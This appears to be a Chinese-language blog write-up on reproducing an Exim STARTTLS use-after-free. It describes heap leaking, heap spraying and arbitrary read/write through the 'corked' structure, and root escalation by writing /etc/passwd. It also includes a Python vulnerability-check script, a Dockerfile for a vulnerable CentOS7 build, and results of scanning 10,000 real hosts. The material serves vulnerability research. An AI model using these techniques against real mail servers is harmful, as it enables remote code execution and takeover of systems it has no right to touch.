`
目的是要把`corked->ptr`设置为0x4120,
这样就能泄漏出0x4120长度的字符串了。基本上会存在堆地址的，如果不存在，就是你的ptr不够大。不过这里要注意，ptr+字符串指针，别超出有效地址范围。
* * *
说完了UAF利用，能泄漏出堆地址后，你就踏出了最重要的一步，比如研究堆泄漏需要花你90%的时间，那研究任意读和任意写只要花5%的时间。
任意读就很简单了，把Github的拿出来改改大部分都能用。思路就是堆喷，喷到`corked`的结构上，把字符串指针改成你想泄漏的地址。长度也就随便改改，比如0x1000。如果没喷上，就调试一下，搜一下喷上的地址区间，然后在改改最开始的poc，让`corked`的地址凑上去，凑不上去，就是你喷的不够大，只要足够大，总能凑上去的。
因为喷的数据有不可显字符，所以也只能用DATA命令来进行堆喷了。
而任意写前面和任意读一样，都是通过堆喷，覆盖`corked`的内容到你想写的地址。但是最后有一点不一样，使用的是`MAIL FROM:
cmd`，这样`tls_write`将会输出`501 cmd: missing or malformed local part (expected word
or \"\r\n")
                data = tls_s.recv(1024)
                if b"OK\r\n" not in data:
                    break
                rcpt_data1 = b"RCPT TO: \r\n"
                for i in range(6):
                    rcpt_data1 += b"RCPT TO: \r\n"
                rcpt_data1 += b"NO"
                tls_s.send(rcpt_data1)
                socket.setdefaulttimeout(1)
                try:
                    tls_s.unwrap()
                except socket.timeout:
                    pass
                socket.setdefaulttimeout(5)
                tls_s._sslobj = None
                # plaintext mode
                sock = tls_s
                sock.send(b"OP\r\n")
                data = sock.recv(1024)
                if b"OK\r\n" not in data:
                    break
                sock.send(b"EHLO hh\r\n")
                data = sock.recv(1024)
                if b"HELP\r\n" not in data:
                    break
                sock.send(b"STARTTLS\r\n")
                data = sock.recv(1024)
                if b"220 TLS go ahead" not in data:
                    break
                tls_s = context.wrap_socket(sock, server_hostname=self.ip)
                # TLS mode
                tls_s.send(b"NOOP\r\n")
                # fd.interactive()
                data = tls_s.recv(1024)
                if b"250 Accepted" in data:
                    result["VerifyInfo"] = {}
                    result['VerifyInfo']["Target"] = self.ip
                    result['VerifyInfo']["Port"] = self.port
                    result['VerifyInfo']["INFO"] = header
                break
            return self.parse_output(result)
### 提权
已经有提权的EXP了，`Debian-exim`用户通过写`/etc/passwd`来进行提权。
最后分享一下RCE + 提权的效果图：
![
](https://images.seebug.org/content/images/2021/06/2592d370-4cd2-42e4-bbf7-b12d81d18433.png-w331s)
### 其他
复现这个漏洞，最花时间的还是在调试泄漏的堆上，其次就是折腾环境。再下来就是折腾python进行TLS wrap的问题了。
遇到一个坑点，在debian上，调用ssl.unwrap没问题，但是在ubuntu上就会卡死。
搜了半天在网上没找到答案，最后使用`strace`进行调试，发现python在unwrap后估计还在等服务器回应，但是服务器不会，所以IO就卡住了。但是这个时候只要客户端发送一个SHUTDOWN包，就能结束TLS信道，切换回明文信道了。
所以只要在调用unwrap的时候设置一个超时就好了。如果是写C的就没这些烦恼了。
期间还尝试了直接用python调用C的API，可以是可以，但是太麻烦了。
这里简单的分享一下，用python调用C的SSL API:
    from cryptography.hazmat.bindings.openssl.binding import Binding
    binding = Binding()
    lib = binding.lib
    _FFI = binding.ffi
    no_zero_allocator = _FFI.new_allocator(should_clear_after_alloc=True)
    lib.SSL_library_init()
    lib.OpenSSL_add_all_algorithms()
    lib.SSL_load_error_strings()
    method = lib.TLSv1_2_client_method()
    ctx = lib.SSL_CTX_new(method)
    tls_s = lib.SSL_new(ctx)
    lib.SSL_set_fd(tls_s, sock.fileno())
    lib.SSL_set_connect_state(tls_s)
    ret = lib.SSL_do_handshake(tls_s)
    # pause()
    if ret:
        ret = lib.SSL_write(tls_s, b"HELP\r\n", 6)
        if ret >= 0:
            buf = no_zero_allocator("char []", 0x1000)
            ret = lib.SSL_read(tls_s, buf, 0x1000)
            data = _FFI.buffer(buf, ret)
            print(data[:])
    lib.SSL_shutdown(tls_s)
### UPDATE 2021/06/03
因为想看看该漏洞的影响情况，所以简单找了1w的目标进行无损探测了一波，结果如下：
![
](https://images.seebug.org/content/images/2021/06/88138df5-0f45-40e3-bc85-e7e8e283edad.png-w331s)
成功率非常低，不过在预期之中。随后又对这成功的61个目标进行了研究，发现这61个目标都是CentOS系统，所以我把目光放到了CentOS上。
我发现CentOS的默认源中，不存在exim包，需要添加epel源，才能安装exim。
经过多次测试研究发现，在CentOS7上，非最新版（大概低了一个版本）[exim
4.92.3](https://bodhi.fedoraproject.org/updates/FEDORA-EPEL-2019-2bdd0ea9d4)存在漏洞，可以成功RCE。
在CentOS8上，`exim 4.93`也测试成功，同样不是最新版。
下面给一个CentOS7的Dockerfile:
    FROM centos:centos7
    RUN yum update -y && yum install -y epel-release wget
    RUN wget https://kojipkgs.fedoraproject.org//packages/exim/4.92.3/1.el7/x86_64/exim-4.92.3-1.el7.x86_64.rpm
    RUN yum install -y exim-4.92.3-1.el7.x86_64.rpm
    COPY exim.crt /etc/pki/tls/certs/exim.pem
    COPY exim.key /etc/pki/tls/private/exim.pem
    COPY exim_start /exim_start
    RUN chmod +x /exim_start
    CMD ["/exim_start"]
总结了一下我测试成功的机器：
  * Debian 10 exim 4.92
  * ubuntu 18.04 exim 4.90
  * CentOS7 exim 4.92
  * CentOS8 exim 4.93
我发现在同一个版本中，即使是不同机器，是可以写出通用的exp的，同一个机器，不同版本，exp是不一样的，而且差距都比较大。
### 参考链接
  1. 
  2. 
  3. 
* * *